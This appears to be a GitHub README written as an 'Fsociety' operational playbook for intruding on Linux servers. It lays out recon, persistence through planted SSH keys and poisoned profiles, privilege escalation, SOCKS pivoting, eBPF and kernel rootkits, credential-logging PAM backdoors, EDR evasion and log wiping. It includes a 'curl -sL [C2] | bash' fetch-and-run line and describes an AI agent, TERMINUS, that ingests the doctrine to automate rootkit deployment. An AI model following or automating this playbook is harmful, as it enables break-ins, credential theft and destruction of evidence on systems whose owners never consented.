<p align="center">
  <img src="https://i.imgur.com/u9C8Cbv.gif" alt="Fsociety Banner"/>
</p>

<p align="center">
<pre>
<font color="#00ADEF">███████╗</font><font color="#FFFFFF">███████╗ ██████╗  ██████╗██╗███████╗████████╗██╗   ██╗</font>
<font color="#00ADEF">██╔════╝</font><font color="#FFFFFF">██╔════╝██╔═══██╗██╔════╝██║██╔════╝╚══██╔══╝╚██╗ ██╔╝</font>
<font color="#00ADEF">█████╗  </font><font color="#FFFFFF">███████╗██║   ██║██║     ██║█████╗     ██║    ╚████╔╝ </font>
<font color="#00ADEF">██╔══╝  </font><font color="#FFFFFF">╚════██║██║   ██║██║     ██║██╔══╝     ██║     ╚██╔╝  </font>
<font color="#00ADEF">██║     </font><font color="#FFFFFF">███████║╚██████╔╝╚██████╗██║███████╗   ██║      ██║   </font>
<font color="#00ADEF">╚═╝     </font><font color="#FFFFFF">╚══════╝ ╚═════╝  ╚═════╝╚═╝╚══════╝   ╚═╝      ╚═╝   </font>
</pre>
</p>

<div align="center">

# <samp>Playbook: Linux_&_Servers_Intrusion</samp>
**<samp>UNIX Subversion | Kernel-Space Annihilation | Living off the Land</samp>**

<br>

<samp>Architect: <a href="https://github.com/fsoc-ghost-0x">C0deGhost</a> | Status: <font color="#00ff00">ACTIVE</font> | Classification: <font color="#f5ba14">SYSTEM_ROOT_RESTRICTED</font></samp>

<br><br>

<img src="https://img.shields.io/badge/Target-Linux%2FUnix_Servers-FCC624?style=for-the-badge&logo=linux&logoColor=black" alt="Target"/>
<img src="https://img.shields.io/badge/Agent-TERMINUS-f5ba14?style=for-the-badge&logo=ghost&logoColor=black" alt="Agent"/>
<img src="https://img.shields.io/badge/Impact-Kernel_Dominance-FF4646?style=for-the-badge&logo=target" alt="Impact"/>

</div>

<br>

> **[ DIRECTIVE LOG ]**
> **Purpose:** Standardize the methodology for breaching, escalating, and dominating Linux/UNIX based server infrastructures.
> **Scope:** Applied across standalone Linux servers, clustered web architectures, and containerized host nodes operating under the UNIX philosophy.

<br>

## <samp>▌ <u>0x01_THE_UNIX_FRONTIER (PHILOSOPHY)</u></samp>

<samp>
In Linux, "Everything is a file". This philosophy is their greatest strength and their fatal flaw. 
<br><br>
We do not blindly execute public exploits. We audit the logic of the environment. A Linux server is a machine of pure execution; if we control the paths, the cronjobs, the shared libraries (<code>LD_PRELOAD</code>), or the execution capabilities, we control the machine. This playbook mandates silent, surgical incursion. We ascend from an unprivileged web shell (<code>www-data</code>) to absolute Ring-0 control (<code>#root</code>) without generating noisy logs, ending with the deployment of eBPF rootkits that make our presence mathematically invisible to the system administrator.
</samp>

<br>

## <samp>▌ <u>0x02_EXECUTION_PHASES (THE ROOT PATH)</u></samp>

| <samp>Phase</samp> | <samp>Tactical Objective</samp> | <samp>Execution Methodology</samp> |
| :--- | :--- | :--- |
| <samp><b>1. Foothold & Stealth Recon</b></samp> | <samp>Map the Local Environment</samp> | <samp>Deployment of silent enumeration scripts entirely in RAM. Mapping SUID/SGID binaries, cron tasks, writeable paths, exposed internal ports, and misconfigured Capabilities (e.g., <code>cap_setuid+ep</code>). No touching disk unless writing to <code>/dev/shm</code>.</samp> |
| <samp><b>2. Ring-3 Persistence</b></samp> | <samp>Secure the Beachhead</samp> | <samp>Before ascending, ensure survival. Injection of malicious SSH keys, hijacking `.bashrc` / `.zshrc` profiles, or poisoning <code>systemd</code> user timers to maintain access if the initial web vulnerability is patched.</samp> |
| <samp><b>3. Vertical Subversion (LPE)</b></samp> | <samp>The Jump to #Root</samp> | <samp>Exploitation of logical flaws: Wildcard injection in cron, Path hijacking, or Shared Library Hijacking. If logic is secure, deploy Kernel-space exploits (UAF, DirtyPipe variants) sourced directly from <code>Alderson_Core</code>.</samp> |
| <samp><b>4. Lateral Movement & Pivoting</b></samp> | <samp>Expand the Blast Radius</samp> | <samp>Execution of SSH Hijacking (stealing active SSH agent sockets from <code>/tmp</code>). Deployment of <code>Chisel</code> or <code>FRP</code> in memory to establish reverse SOCKS5 proxies, tunneling attack traffic deep into the isolated internal network.</samp> |
| <samp><b>5. Absolute Dominance (Ring-0)</b></samp> | <samp>Invisibility & Total Control</samp> | <samp>Deployment of custom eBPF (Extended Berkeley Packet Filter) or LKM (Loadable Kernel Module) rootkits. Hiding processes, hiding network connections, logging SSH passwords via PAM backdoors, and wiping the <code>auth.log</code> / <code>syslog</code> traces.</samp> |

<br>

## <samp>▌ <u>0x03_THE_TACTICAL_ARSENAL (LINUX)</u></samp>

<samp>To bypass modern Linux EDRs (e.g., CrowdStrike Falcon for Linux, Auditd), we utilize customized, obfuscated variants from our proprietary forge:</samp>

*   **Custom eBPF Rootkits:** Stealth implants that manipulate system calls at the kernel level without triggering traditional Loadable Kernel Module (LKM) alarms.
*   **Polymorphic ELF Injectors:** Tools designed to inject malicious shellcode into running, legitimate processes (e.g., `nginx` or `sshd`) using `ptrace` for fileless execution.
*   **PAM-Backdoors:** Custom Pluggable Authentication Modules (PAM) compiled to accept a universal master password while simultaneously logging all legitimate user credentials to a hidden sector.
*   **In-Memory LinPEAS (Stripped):** Reconnaissance scripts stripped of all known signatures, executed via `curl -sL [C2] | bash` to evade static analysis.

<br>

## <samp>▌ <u>0x04_ATTACK_FLOW (THE KILL-CHAIN)</u></samp>

<samp>Visual representation of the Linux Server Annihilation process:</samp>

```mermaid
graph TD;
    ZERO["<b>Patient Zero</b><br>(Unprivileged Shell: www-data)"] --> RECON["<b>In-Memory Recon</b><br>(Capabilities, SUIDs, Cron)"];
    
    RECON --> LOGIC{"<b>Logical Flaws?</b>"};
    LOGIC -- Yes --> LPE_LOGIC["<b>Logical Escalation</b><br>(Path Hijacking / Sudo Misconfig)"];
    LOGIC -- No --> KERNEL["<b>Kernel Escalation</b><br>(Weaponized CVE / Ring-0 Exploit)"];
    LOGIC -- Container --> ESCAPE["<b>Container Breakout</b><br>(Mounting host / cgroups abuse)"];

    LPE_LOGIC --> ROOT["<b>#ROOT / SYSTEM</b>"];
    KERNEL --> ROOT;
    ESCAPE --> ROOT;

    ROOT --> PIVOT["<b>Lateral Movement</b><br>(SSH Hijacking / SOCKS Tunnels)"];
    ROOT --> GHOST["<b>Absolute Persistence</b><br>(eBPF Rootkit / PAM Backdoor)"];
    ROOT --> CLEAN["<b>Forensic Wiping</b><br>(Scrubbing /var/log & .bash_history)"];

    style ZERO fill:#111,stroke:#666,stroke-width:1px,color:#aaa
    style RECON fill:#111,stroke:#00adef,stroke-width:2px,color:#fff
    style LOGIC fill:#111,stroke:#f5ba14,stroke-width:2px,color:#fff
    style LPE_LOGIC fill:#111,stroke:#ff4646,stroke-width:2px,color:#fff
    style KERNEL fill:#111,stroke:#ff4646,stroke-width:2px,color:#fff
    style ESCAPE fill:#111,stroke:#ff4646,stroke-width:2px,color:#fff
    style ROOT fill:#111,stroke:#00ff00,stroke-width:3px,color:#00ff00
    style PIVOT fill:#111,stroke:#ff8c00,stroke-width:2px,color:#fff
    style GHOST fill:#111,stroke:#f5ba14,stroke-width:2px,color:#fff
    style CLEAN fill:#111,stroke:#00adef,stroke-width:2px,color:#fff
```

<br>

## <samp>▌ <u>0x05_PROJECT_ARCHON_INTEGRATION (TERMINUS)</u></samp>

<div style="border-left: 4px solid #f5ba14; padding-left: 15px; background: rgba(245, 186, 20, 0.05); padding: 15px;">
<samp>
This playbook serves as the execution core for <b>[+] TERMINUS</b>.
<br><br>
When the NEXUS breaches a UNIX environment, the AI delegates control to TERMINUS. The agent ingests this doctrine to understand that brute-forcing is lethal to OPSEC. It learns to read the exact architecture of the machine, favoring logical Local Privilege Escalation (LPE) before engaging risky Kernel-space payloads. TERMINUS automates the transition from a reverse shell to an invisible, persistent rootkit.
</samp>
</div>

<br>

<div align="center">
<hr style="width: 80%; border: 1px solid #333;">
<br>
<samp><strong><font color="#00ADEF">WE ARE FSOCIETY. WE ARE FINALLY FREE. WE ARE FINALLY AWAKE.</font></strong></samp>
</div>
